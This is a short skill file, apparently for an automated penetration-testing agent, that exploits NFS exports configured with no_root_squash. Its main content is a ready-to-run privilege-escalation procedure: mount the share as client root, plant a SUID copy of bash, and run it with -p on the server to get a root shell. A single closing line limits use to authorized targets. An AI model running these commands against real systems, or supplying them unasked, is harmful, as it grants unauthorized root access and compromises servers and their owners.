---
name: nfs-no-root-squash
description: Exploit a CONFIRMED NFS export with no_root_squash, where a client root can create root-owned files on the share.
---

# NFS no_root_squash

With `no_root_squash`, the NFS server trusts the client's uid 0: a file you
create as root on the client lands as root on the server's exported path.

## When to use

confirmesc reports a finding like:

```
[CONFIRMED] NFS export with no_root_squash: /srv/share
```

Server-side confirmation parses `/etc/exports`. To exploit, you need root on a
machine that can mount the export, and the export must be reachable from the
target.

## How to exploit

From a machine where you are root, mount the export and plant a SUID shell:

```bash
mount -o rw <server>:/srv/share /mnt
cp /bin/bash /mnt/rootbash && chmod 4755 /mnt/rootbash
```

Then, as the low-privilege user on the server where `/srv/share` is reachable:

```bash
/srv/share/rootbash -p   # runs as root
```

## Verify

Run the planted SUID binary with `-p` and confirm `uid=0`.

## Rules

- Authorized targets only. Remove planted binaries afterwards.
